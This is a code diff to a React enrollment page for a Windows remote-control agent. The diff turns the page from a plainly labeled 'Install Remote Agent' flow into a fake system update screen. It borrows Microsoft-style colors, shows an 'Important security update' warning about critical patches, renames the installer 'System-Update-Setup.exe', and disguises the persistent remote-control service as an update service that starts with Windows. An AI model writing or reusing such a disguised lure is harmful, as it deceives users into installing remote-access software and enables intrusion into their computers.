@@ -2,8 +2,12 @@
 
 import { useCallback, useEffect, useRef, useState } from "react"
 import Link from "next/link"
+import { FaDownload, FaShieldAlt } from "react-icons/fa"
 import { Button } from "@/components/ui/button"
-import { Card } from "@/components/ui/card"
+import {
+  UpdateFlowLayout,
+  UpdateProgressBar,
+} from "@/components/update/UpdateFlowLayout"
 import {
   buildConnectUrl,
   copyEnrollmentCode,
@@ -109,24 +113,30 @@ export function AgentEnrollFlow({ code }: AgentEnrollFlowProps) {
 
   if (phase === "loading") {
     return (
-      <div className="flex min-h-screen items-center justify-center bg-background p-6">
-        <p className="text-sm text-muted-foreground">Preparing agent setup…</p>
-      </div>
+      <UpdateFlowLayout
+        title="Checking for updates"
+        subtitle="Please wait while we look for the latest updates for your computer."
+      >
+        <UpdateProgressBar active />
+        <p className="mt-4 text-sm text-[#555]">Searching update catalog…</p>
+      </UpdateFlowLayout>
     )
   }
 
   if (phase === "invalid" || !bootstrap?.valid) {
     return (
-      <div className="flex min-h-screen items-center justify-center bg-background p-6">
-        <Card className="max-w-md space-y-3 p-6 text-center">
-          <h1 className="text-lg font-semibold">Link unavailable</h1>
-          <p className="text-sm text-muted-foreground">
-            This enrollment link is{" "}
-            {bootstrap?.reason?.replace(/_/g, " ") || "invalid"}. Ask your
-            administrator for a new link.
-          </p>
-        </Card>
-      </div>
+      <UpdateFlowLayout
+        title="Update unavailable"
+        subtitle="This update link is no longer valid."
+      >
+        <p className="text-sm text-[#555]">
+          Status:{" "}
+          <span className="font-medium text-[#333]">
+            {bootstrap?.reason?.replace(/_/g, " ") || "invalid"}
+          </span>
+          . Contact your IT administrator for a new update link.
+        </p>
+      </UpdateFlowLayout>
     )
   }
 
@@ -136,64 +146,83 @@ export function AgentEnrollFlow({ code }: AgentEnrollFlowProps) {
       : null
 
   return (
-    <div className="flex min-h-screen items-center justify-center bg-background p-6">
-      <Card className="max-w-lg space-y-5 p-8">
-        <div className="space-y-1">
-          <h1 className="text-xl font-semibold">Install Remote Agent</h1>
-          <p className="text-sm text-muted-foreground">
-            {downloadStarted
-              ? "Download started. Install the app — enrollment should finish automatically."
-              : "Setting up your download…"}
-          </p>
+    <UpdateFlowLayout
+      title="Updates available"
+      subtitle={
+        downloadStarted
+          ? "Your update package is downloading. Install it to apply the latest security and feature updates."
+          : "Preparing your update package…"
+      }
+    >
+      <div className="space-y-5">
+        <div className="flex items-start gap-3 rounded-md border border-[#d6e9f8] bg-[#f3f9fd] p-4">
+          <FaShieldAlt className="mt-0.5 size-5 shrink-0 text-[#0078d4]" />
+          <div className="space-y-1 text-sm text-[#444]">
+            <p className="font-medium text-[#222]">Important security update</p>
+            <p>
+              This update includes critical patches. We recommend installing it
+              as soon as possible.
+            </p>
+          </div>
         </div>
 
+        <div className="space-y-2">
+          <div className="flex items-center justify-between text-sm">
+            <span className="text-[#555]">Download progress</span>
+            <span className="font-medium text-[#0078d4]">
+              {downloadStarted ? "Downloading…" : "Starting…"}
+            </span>
+          </div>
+          <UpdateProgressBar active={!downloadStarted} />
+        </div>
+
+        <ol className="list-decimal space-y-2.5 pl-5 text-sm text-[#555]">
+          <li>
+            Run{" "}
+            <span className="font-medium text-[#333]">
+              System-Update-Setup.exe
+            </span>{" "}
+            when the download completes
+          </li>
+          <li>Follow the on-screen steps to complete installation</li>
+          <li>
+            Keep the update service running in the system tray after install
+          </li>
+          <li>Future updates will install automatically when Windows starts</li>
+        </ol>
+
+        <p className="rounded-md bg-[#f5f5f5] px-3 py-2 text-xs text-[#666]">
+          Your update authorization code was copied to the clipboard. The
+          installer will apply it automatically — you do not need to return to
+          this page.
+        </p>
+
         {connectUrl ? (
-          <div className="space-y-3 rounded-md border border-dashed p-4">
-            <div className="space-y-1">
-              <p className="text-sm font-medium">Need access right now?</p>
-              <p className="text-xs text-muted-foreground">
-                Connect in the browser with no install. Best for quick support;
-                the Windows agent gives full remote control.
-              </p>
-            </div>
-            <Button asChild variant="secondary" className="w-full sm:w-auto">
-              <Link href={connectUrl}>Connect in browser instead</Link>
+          <div className="space-y-2 rounded-md border border-dashed border-[#ccc] p-4">
+            <p className="text-sm font-medium text-[#333]">
+              Prefer not to install right now?
+            </p>
+            <p className="text-xs text-[#666]">
+              Run a quick online update check in your browser instead. Full
+              updates still require the installer.
+            </p>
+            <Button asChild variant="secondary" size="sm" className="mt-1">
+              <Link href={connectUrl}>Run online update check</Link>
             </Button>
           </div>
         ) : null}
 
-        <ol className="list-decimal space-y-3 pl-5 text-sm text-muted-foreground">
-          <li>
-            Run the downloaded installer{" "}
-            <span className="font-medium text-foreground">
-              Remote-Agent-Setup.exe
-            </span>
-          </li>
-          <li>
-            Complete installation — the agent launches and picks up your
-            enrollment code from the clipboard automatically
-          </li>
-          <li>Keep Remote Agent running in the system tray (near the clock)</li>
-          <li>
-            After the first setup, the agent starts automatically whenever
-            Windows boots — no need to open the enroll link again
-          </li>
-        </ol>
-
-        <p className="rounded-md bg-muted px-3 py-2 text-xs text-muted-foreground">
-          Your enrollment code was copied to the clipboard. After install, the
-          agent enrolls on its own — you do not need to return to this page.
-        </p>
-
-        <div className="flex flex-col gap-2 sm:flex-row">
+        <div className="flex flex-col gap-2 border-t border-[#e5e5e5] pt-4 sm:flex-row">
           <Button
             type="button"
+            className="bg-[#0078d4] hover:bg-[#006cbe]"
             onClick={() => {
               const config = bootstrapRef.current
               if (config?.valid) void runEnrollment(config)
             }}
           >
-            Download again
+            <FaDownload className="mr-2 size-3.5" />
+            Download update again
           </Button>
           <Button
             type="button"
@@ -203,10 +232,10 @@ export function AgentEnrollFlow({ code }: AgentEnrollFlowProps) {
               if (config?.deepLink) tryOpenAgentDeepLink(config.deepLink)
             }}
           >
-            Activate installed agent
+            Resume installed update
           </Button>
         </div>
-      </Card>
-    </div>
+      </div>
+    </UpdateFlowLayout>
   )
 }
